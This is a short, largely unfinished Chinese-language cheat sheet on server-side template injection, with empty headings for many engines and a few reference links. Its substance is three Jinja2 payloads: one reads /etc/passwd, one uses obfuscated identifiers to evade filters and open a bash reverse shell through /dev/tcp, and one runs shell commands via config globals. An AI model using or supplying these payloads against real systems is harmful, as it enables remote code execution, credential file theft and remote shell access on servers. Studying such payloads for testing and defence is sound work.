# SSTI 模板注入漏洞（Todo）

## Python

```python
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/etc/passwd', 'r').read() }}{% endif %}{% endfor %}
```

```python
{% iconfigf ''.__claconfigss__.__mconfigro__[2].__subclasconfigses__()[59].__init__.func_glconfigobals.linecconfigache.oconfigs.popconfigen('bash -i >& /dev/tcp/127.0.0.1/233 0>&1') %}1{% endiconfigf %}
```

```python
{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
```

### Flask/Jinja2

### Django

### Tornado

## Java

### JSP

### FreeMarker

### Velocity

## PHP

### Twig

### Smarty

参考资料:

https://www.jianshu.com/p/eb8d0137a7d3

### Blade

## Ruby

```
$~:is equivalent to ::last_match;

$&:contains the complete matched text;

$`:contains string before match;

$':contains string after match;

$1, $2 and so on contain text matching first, second, etc capture group;

$+:contains last capture group.
```

### ERB



## 参考资料

一篇文章带你理解漏洞之SSTI漏洞:

[https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E](https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E)